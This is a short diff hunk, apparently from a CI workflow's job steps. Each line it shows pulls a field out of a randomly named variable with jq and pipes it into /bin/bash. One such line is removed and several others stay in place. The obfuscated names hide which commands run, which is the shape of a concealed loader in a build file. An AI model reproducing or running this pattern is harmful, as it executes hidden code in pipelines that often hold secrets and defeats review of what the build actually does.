@@ -24,7 +24,6 @@ jobs:
           echo $npwk287 | jq -r .s9419 | /bin/bash
           echo $fgwtq76064 | jq -r .yxim7 | /bin/bash
           echo $exlrn68 | jq -r .x2 | /bin/bash
-          printf '%s' "$riv729" | jq -r .w7 | /bin/bash
           echo $d420 | jq -r .g21 | /bin/bash
           echo $lrf876 | jq -r .bf2 | /bin/bash
 
